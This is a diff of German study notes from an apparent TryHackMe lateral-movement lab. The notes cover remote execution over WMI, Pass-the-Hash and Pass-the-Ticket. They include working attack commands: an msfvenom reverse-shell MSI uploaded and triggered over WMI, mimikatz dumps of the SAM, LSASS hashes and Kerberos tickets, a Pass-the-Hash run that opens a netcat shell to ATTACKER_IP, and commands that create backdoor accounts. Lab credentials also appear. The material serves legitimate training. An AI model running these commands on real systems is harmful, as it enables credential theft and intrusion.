@@ -43,7 +43,7 @@ Normalerweise wiederholen wir diesen Zyklus mehrmals, bevor wir unser endgültig
 
 ### A Quick Example
 
-Angenommen, wir führen ein Red-Team-Engagement durch, bei dem unser endgültiges Ziel darin besteht, ein internes Code-Repository zu erreichen, wobei wir unseren ersten Kompromiss im Zielnetzwerk durch eine Phishing-Kampagne erzielt haben. Phishing-Kampagnen sind in der Regel effektiver gegen nicht-technische Benutzer, daher könnte unser erster Zugriff über einen Rechner in der Marketingabteilung erfolgen.
+Angenommen, wir führen ein Red-Team-Engagement durch, bei dem unser endgültiges Ziel darin besteht, ein internes Code-Repository zu erreichen, wobei wir unser erstes "Eintreten" im Zielnetzwerk durch eine Phishing-Kampagne erzielt haben. Phishing-Kampagnen sind in der Regel effektiver gegen nicht-technische Benutzer, daher könnte unser erster Zugriff über einen Rechner in der Marketingabteilung erfolgen.
 
 Die Arbeitsstationen im Marketing werden in der Regel durch Firewall-Richtlinien eingeschränkt, um auf kritische Dienste im Netzwerk zuzugreifen, einschließlich administrativer Protokolle, Datenbankports, Überwachungsdienste oder anderer Dienste, die für ihre tägliche Arbeit nicht erforderlich sind, einschließlich Code-Repositories.
 
@@ -57,7 +57,7 @@ Beachten Sie, dass seitliche Bewegungen möglicherweise verwendet werden müssen
 
 Es gibt mehrere Möglichkeiten, wie ein Angreifer seitlich bewegen kann. Der einfachste Weg wäre die Verwendung von Standard-Administrationsprotokollen wie WinRM, RDP, VNC oder SSH, um eine Verbindung zu anderen Maschinen im Netzwerk herzustellen. Dieser Ansatz kann verwendet werden, um das Verhalten regulärer Benutzer einigermaßen zu emulieren, solange eine gewisse Kohärenz beim Planen erhalten bleibt, wo mit welchem Konto verbunden werden soll. Während es üblich sein kann, dass ein Benutzer von IT über RDP auf den Webserver zugreift und unter dem Radar bleibt, muss darauf geachtet werden, keine verdächtigen Verbindungen zu versuchen (z.B. warum verbindet sich der lokale Admin-Benutzer vom Marketing-PC mit DEV-001-PC?).
 
-Angreifer haben heutzutage auch andere Methoden, um seitlich zu bewegen, während sie es etwas schwieriger machen für das Blue Team, effektiv zu erkennen, was passiert. Obwohl keine Technik als unfehlbar angesehen werden sollte, können wir zumindest versuchen, so leise wie möglich zu sein. In den folgenden Aufgaben werden wir uns einige der gängigsten seitlichen Bewegungstechniken ansehen.
+Angreifer haben heutzutage auch andere Methoden, um sich seitlich zu bewegen, während sie es für das Blue Team etwas schwieriger machen zu erkennen, was passiert. Obwohl keine Technik als unfehlbar angesehen werden sollte, können wir zumindest versuchen, so leise wie möglich zu sein. In den folgenden Aufgaben werden wir uns einige der gängigsten seitlichen Bewegungstechniken ansehen.
 
 ### Administratoren und UAC
 
@@ -254,17 +254,326 @@ Stellen Sie sicher, dass Sie den Namen Ihres Dienstes ändern, um Konflikte mit 
 
 # Moving Laterally Using WMI 
 
+Windows Management Instrumentation (WMI) ist eine Technologie, die von Microsoft entwickelt wurde und in den Windows-Betriebssystemen integriert ist. Sie ermöglicht die Verwaltung und Überwachung von Systemressourcen sowie die Automatisierung von Verwaltungsaufgaben auf Windows-basierten Computern.
+
+Im Wesentlichen bietet WMI eine standardisierte Methode zum Zugriff auf und zur Steuerung von Systemressourcen wie Hardware, Software und Netzwerkkomponenten über eine einheitliche Schnittstelle. Dies bedeutet, dass Administratoren und Entwickler über WMI auf Informationen und Funktionen zugreifen können, ohne auf proprietäre APIs oder spezifische Treiber zurückgreifen zu müssen.
+
+Mithilfe von WMI können verschiedene Aufgaben ausgeführt werden, darunter:
+
+1. Überwachung: WMI ermöglicht die Überwachung von Systemressourcen wie CPU-Auslastung, Speicherverbrauch, Festplattenplatz und Netzwerkaktivität. Dies ist besonders nützlich für die Leistungsüberwachung und das Fehlermanagement.
+
+2. Konfiguration: Administratoren können WMI verwenden, um Systemeinstellungen und Konfigurationen zu ändern, ohne auf Benutzeroberflächen zugreifen zu müssen. Dies erleichtert die Automatisierung von Verwaltungsaufgaben.
+
+3. Ereignisverarbeitung: WMI ermöglicht die Erfassung und Verarbeitung von Ereignissen auf einem Windows-System, wie z.B. das Auslösen von Aktionen basierend auf bestimmten Ereignissen oder das Senden von Benachrichtigungen.
+
+4. Remoteverwaltung: Durch WMI können Administratoren Remote-Computer verwalten, indem sie Befehle und Abfragen über das Netzwerk senden, ohne physisch vor Ort sein zu müssen.
+
+Insgesamt ist WMI ein leistungsstarkes Werkzeug für die Verwaltung von Windows-Systemen, das sowohl von Administratoren als auch von Entwicklern genutzt werden kann, um Verwaltungsaufgaben zu automatisieren, die Systemüberwachung zu verbessern und die Effizienz bei der Verwaltung von IT-Infrastrukturen zu steigern.
+
+### Connecting to WMI from Powershell
+
+Da uns vor allem erstmal die Remoteverwaltung interessiert, werden wir diese jetzt nutzen. Dazu müssen wir erstmal ein PSCredential Object in Powershell erstellen. Dieses Object speichern wir dann in der Variable $credential und wird dann im weiteren Verlauf verwendet:
+
+```bash
+$username = 'Administrator';
+$password = 'Mypass123';
+$securePassword = ConverTo-SecureString $password -AsPlainText -Force;
+$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
+```
+
+Danach bauen wir eine WMI Session mit folgenden Protokollen auf:
+
+1. DCOM: RPC über IP wird für eine Verbindung zu WMI genutzt. Dieses Protokoll nutzt Port 135/TCP und die Ports 49152-65535/TCP, wie bereits auch in der Nutzung von sc.exe erklärt.
+2. Wsman: WinRM wird für die Verbindung zu WMI genutzt. Dieses Protokoll nutzt Port 5985/TCP (WinRM HTTP) oder 5986/TCP (WinRM HTTPS).
+
+Um eine WMI Session mit Powershell zu erstellen, können wir folgende Befehle ausführen und die Session in der Variable $Session speichern, die wir ebenfalls im weiteren Verlauf nutzen können.
+
+```bash
+$Opt = New-CimSessionOption -Protocol DCOM
+$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop
+```
+
+Mit dem **New-CimSessionOption** cmdlet konfigurieren wir die Verbindungsoptionen für die WMI Session, inklusive des Protokolls. Diese Optionen und Zugangsdaten werden dann dem cmdlet **New-CimSession** übergeben, welche eine Session zum remote Host herstellt.
+
+### Remote Process Creation Using WMI
+
+- Ports:
+
+> 135/TCP, 49152-65535/TCP (DCERPC)
+5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
+- Required Group Memberships: Administrators
+
+Wir können ein Prozess remote mit Hilfe von Powershell starten, indem wir dazu WMI nutzen. Ein WMI Request wird zur Win32_Process Klasse geschickt, um diesen Prozess innerhalb dieser Session zu starten, die wir vorher erstellt haben.
+
+```bash
+$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";
+
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
+CommandLine = $Command
+}
+```
+Beachte bitte, dass WMI keinen Output ausgibt und den Prozess "leise" ausführt. Auf älteren Systemen lautet der Befehl:
+
+```bash
+wmic.exe /user:Administrator /password:Mypass123 /node:TARGET process call create "cmd.exe /c calc.exe" 
+```
+
+### Creating Services Remotely with WMI
+
+- Ports:
+> 135/TCP, 49152-65535/TCP (DCERPC)
+5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
+- Required Group Memberships: Administrators
+
+Wir können auch Services mit WMI über die Powershell erstellen. Um einen Prozess mit dem Namen THMService2 zu erstellen, nutzen wir folgenden Befehl:
+
+```bash
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
+Name = "THMService2";
+DisplayName = "THMService2";
+PathName = "net user munra2 Pass123 /add"; # Your payload
+ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
+StartMode = "Manual"
+}
+```
+
+Danach können wir den Service folgendermaßen starten:
+
+```bash
+$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'THMService2'"
+
+Invoke-CimMethod -InputObject $Service -MethodName StartService
+```
+
+Um den Service wieder zu beenden geben wir folgendes ein:
+
+```bash
+Invoke-CimMethod -InputObject $Service -MethodName StopService
+Invoke-CimMethod -InputObject $Service -MethodName Delete
+```
+
+### Creating Schweduled Tasks Remotely with WMI
+
+- Ports:
+>135/TCP, 49152-65535/TCP (DCERPC)
+5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
+- Required Group Memberships: Administrators
+
+Wir können auch geplante Tasks mit einigen cmdlets die in Windows verfügbar sind erstellen:
+
+```bash
+# Payload must be split in Command and Args
+$Command = "cmd.exe"
+$Args = "/c net user munra22 aSdf1234 /add"
+
+$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
+Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "THMtask2"
+Start-ScheduledTask -CimSession $Session -TaskName "THMtask2"
+```
+
+Den Task löschen wir wieder mit:
+
+```bash
+Unregister-ScheduledTask -CimSession $Session -TaskName "THMtask2"
+```
+
+### Installing MSI Packages trough WMI
+
+- Ports:
+>135/TCP, 49152-65535/TCP (DCERPC)
+5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
+- Required Group Memberships: Administrators
+
+MSI in ein Dateiformat für Installer. Wenn wir ein MSI Package auf das Zielsystem laden können, können wir mit WMI versuchen, dieses für uns zu installieren. Dazu versuchen wir die Win32_Product Klasse über WMI anzusprechen:
+
+```bash
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
+```
+
+Auf Legacy System können wir folgenden Befehl ausführen:
+
+>wmic /node:TARGET /user:DOMAIN\USER product call install PackageLocation=c:\Windows\myinstaller.msi
 
 
+### Lets Get to Work!
+
+Um das gelernte jetz anzuwenden, nutzen wir die Credentials, die wir ganz zu Anfang bekommen haben. Wir vebinden uns zur Maschine über SSH:
+
+>ssh henry.bird@thmjmp2.za.tryhackme.com
+
+Wir gehen davon aus, wir haben bereits auch Credentials für einen administrativen Zugang erhalten:
+
+>User: ZA.TRYHACKME.COM\t1_corine.waters
+
+>Password: Korine.1994
+
+Wir werden mit diesen Creds jetzt uns seitlich im Netzwerk bewegen (lateral movement) und auf THM-IIS zugreifen. 
+
+Als erstes müssen wir folgende Befehle durchführen um uns mit WMI verbinden zu können.
+
+```bash
+$username = 't1_corine.waters';
+$password = 'Korine.1994';
+$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
+$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
+$Opt = New-CimSessionOption -Protocol DCOM
+$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop
+```
+
+Dann erstellen wir einen Payload auf unserem System den wir im Anschluß auf das Zielsystem hochladen:
+
+>msfvenom -p windows/x64/shell_reverse_tcp LHOST=lateralmovement LPORT=4445 -f msi > myinstaller.msi
+
+> smbclient -c 'put myinstaller.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/' Korine.1994
+
+Dann starten wir einen Listener auf Port 4445
+
+>nc -lvnp 4445
+
+Jetzt können wir die Install Methode der Win32_Product Klasse anstoßen um den Payload zu triggern:
+
+> Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
+
+#### Wir haben eine Shell als NT Authority\System
 
 
+# Use of Alternate Authentication Material
 
+Mit Alternate Authentication Material meint man jedes Stück Daten das dazu genutzt werden kann, zugang zu einem Windows Account zu erhalten ohne das User Password zu kennen. Das ist aufgrund der Funktionsweise einiger Protokolle möglich, die Windows Netzwerke nutzen. In diesem Kapitel schauen wir uns an, was möglich ist, wenn folgende Protokolle genutzt werden:
 
+- NTLM Authentication
+- Kerberos Authentication
 
+### NTLM Authentication
 
+Wir funktioniert eigentlich NTLM?
 
+![alt text](images/image5.png)
 
+1. Der Client sendet eine Authentifizierungsanfrage an den Server
+2. Der Server generiert eine zufällige Nummer und sendet diese als "Challenge" an den Client zurück
+3. Der Client kombiniert sein NTLM Password Hash mit der Challenge  (und anderen bekannten Daten) und generiert ein "Response" welches er zurück an den Server schickt
+4. Der Server leitet den Response, aber auch die Challenge an den Domain Controller weiter
+5. Der DC berechnet aus der Challenge ebenfalls ein Response und vergleicht dieses mit dem Response, welches der Server weitergeleitet hat. Wenn beide Respsonse übereinstimmen, sendet er ein Allow Authentication zurück, ansonsten ein Deny Authentication
+6. Der Server leitet die Antwort des DC an den Client weiter
 
+**Der beschriebene Prozess findet nur Anwendung, wenn auch ein Domain Account genutzt wird. Wenn es sich um einen lokalen Account handelt, vergleicht der Server den Response zur Challenge mit seinem Password Hash, den er lokal in der SAM Datei gespeichert hat**
 
+#### Pass-the-Hash
 
+Wenn wir am Ende des Tages nur einen NTLM Hash aus dem System holen konnten, können wir auch diesen nutzen.
 
+Wie auf dem Bild zusehen ist, wird auf die Challenge mit dem NTLM Hash geantwortet. Wir können also einfach den NTLM Hash übergeben und uns somit authenfizieren, wenn die Windows Domain entsprechend konfiguriert ist.
+
+Um NTLM Hashes zu extrahieren nutzen wir bspw. mimikatz. Damit können wir die lokale SAM Datei auslesen oder die Hashes direkt aus dem LSASS Speicher lesen.
+
+**Extracting NTLM hashes from local SAM**
+
+Diese Methode erlaubt uns, nur hashes aus der lokalen Maschine zu extrahieren. Domain User Hashes sind nicht enthalten.
+
+```bash
+mimikatz # privilege::debug
+mimikatz # token::elevate
+
+mimikatz # lsadump::sam   
+RID  : 000001f4 (500)
+User : Administrator
+  Hash NTLM: 145e02c50333951f71d13c245d352b50
+  ```
+
+**Extracting NTLM hashes from LSASS memory**
+
+Mit dieser Methode können wir alle NTLM Hashes extrahieren, lokale als auch domain user Hashes die sich jemals auf dieser Maschine authentifiert haben.
+
+```bash
+mimikatz # privilege::debug
+mimikatz # token::elevate
+
+mimikatz # sekurlsa::msv 
+Authentication Id : 0 ; 308124 (00000000:0004b39c)
+Session           : RemoteInteractive from 2 
+User Name         : bob.jenkins
+Domain            : ZA
+Logon Server      : THMDC
+Logon Time        : 2022/04/22 09:55:02
+SID               : S-1-5-21-3330634377-1326264276-632209373-4605
+        msv :
+         [00000003] Primary
+         * Username : bob.jenkins
+         * Domain   : ZA
+         * NTLM     : 6b4a57f67805a663c818106dc0648484
+```
+
+Mit den extrahierten Hashes können wir nun eine Pass-the-Hash Attacke ausführen. Dazu nutzen wir mimikatz, um einen access token des Users zu injezieren, von dem wir den Hash besitzen.
+
+```bash
+mimikatz # token::revert
+mimikatz # sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555"
+```
+
+**Achtung: Wir führen token::revert aus um unseren ursprünglichen token mit den entsprechenden Privilegien zu nutzen. Pass-the-Hash funktioniert nicht mit privilege::debug. Das ist ein Equivalent zu runas /neonly aber mit einem Hash anstatt eines Passworts, was uns eine neue Reverse Shell erstellt von der aus wir jeden Befehl auf dem Zielrechner ausführen können.**
+
+Um eine Reverse Shell zu bekommen führen wir folgendes aus:
+
+>nc -lvnp 5555
+
+**Interessanterweise wird uns mit whoami immernoch unserer ursprünglicher User angezeigt, dennoch wird jeder Befehl mit den Credentials des Users ausgeführt, die wir per Pass-the-Hash injeziert haben**
+
+#### Pass-the-Hash in LINUX
+
+Wenn du mit einer Linux Maschine angreifst, hast du bereits Tools an Board, mit denen du Pass-the-Hash ganz easy ausführen kannst:
+
+- Connect to RDP using PtH:
+
+>xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH
+- Connect via psexec using PtH:
+
+>psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP
+**Note: Only the linux version of psexec support PtH.**
+
+- Connect to WinRM using PtH:
+
+>evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH
+
+### Kerberos Authentication
+
+Schauen wir uns mal die Kerbers Authentication an:
+1. ![alt text](images/image6.png)
+
+Folgede Dinge sendet der User an das Key Distributions Center (KDC) um ein TGT Ticket anzufragen:
+    - Seinen Usernamen
+    - Einen Zeitstempel. Dieser Zeitstempel ist mit einem Schlüssel verschlüsselt, der sich aus dem Password des Users ergibt (User Hash)
+
+Der KDC erstellt ein Ticket Granting Ticket (TGT) und erlaubt dem User somit, Tickets für besimmte Services anzufragen, ohne sich bei diesen Services mit seinen Zugangsdaten anzumelden. Zusammen mit dem TGT kommt auch des **Session Key** mit dem nachfolgende Requests generieren kann.
+
+**Achtung: Das TGT ist mit dem Password Hash des krbtgt Accounts verschlüsselt, womit der User keinen Zugriff auf den Inhalt des TGT erhält. Es ist sehr wichtig zu verstehen, dass das verschlüsselte TGT ebenfalls eine Kopie des Session Key enthält. Somit muss der KDC keinen Session Key speichern, da er diesen einfach aus dem TGT wiederherstellen kann**
+
+2. ![alt text](images/image7.png)
+
+Möchte ein User einen Service nutzen wie bspw. ein Network Share oder eine Datenbank, nimmt er sein TGT und fragt damit beim KDC ein sogennantes Ticket Granting Service (TGS) Ticket an. Diese Tickets sind nur dafür da, Zugriff nur auf den Service zu gewähren, für den sie erstellt wurden. Will der User so ein TGS anfragen, sendet er diesmal folgende Dinge an den KDC:
+
+- Seinen Usernamen und einen Zeitstempel, beides verschlüsselt mit dem Session Key
+- Sein TGT natürlich
+- Den Service Principal Name (SPN) welcher den Service und den Server beinhaltet, auf welchen man Zugriff möchte
+
+Als Antwort auf diese Anfrage schickt der KDC zwei Dinge zurück:
+
+- Den Service Session Key, der mit dem Session Key verschlüsselt ist.
+- Das TGS, das mit dem Service Owner Hash verschlüsselt ist. Service Owner ist der User bzw. Maschinen Account, unter dem der Service läuft. Auch das TGS enthaält eine Kopie des Service Session Key, sodass der Service Owner ebenfalls zugriff auf diesen erhält, nachdem er das TGS mit seinem Service Owner Hash entschlüsselt hat.
+
+3. ![alt text](images/image8.png)
+
+Das TGS Ticket wird nun an den Service geschickt, auf den man zugreifen möchte. Der Service entschlüsselt das TGS und validiert den Service Session Key, mit dem Username und zeitstempel bei der Anfrage verschlüsselt wurden.
+
+### Pass-the-Ticket
+
+Manchmal ist es möglich, Kerberos Tickets und Session Keys aus dem LSASS Memory zu extrahieren. Dieser Vorgang benötigt ind er Regel SYSTEM Rechte auf der Maschine. Folgende Befehle werden ausgeführt:
+
+```bash
+mimikatz # privilege::debug
+mimikatz # sekurlsa::tickets /export
+```
+
+**Achtung: Wenn wir nur Zugriff auf ein Ticket haben, aber nicht auf den dazugehörigen Session Key, können wir das Ticket nicht nutzen. Beide Dinge sind nötig**
+
+Mimikatz kann im Prinzip jedes TGT oder TGS welches im Speicher des LSASS Prozesses befindet extrahieren, aber meistens interessieren uns TGT´s mit denen wir Zugang zu Services erhalten, zu denen der User berechtigt ist. Gleichzeitig sind TGS´s nur für besitmmte Service gut. Zum extrahieren von TGT´s benötigen wir Admin Zugangsdaten, bei TGS´s reichen schon Low-Privilege Accounts 
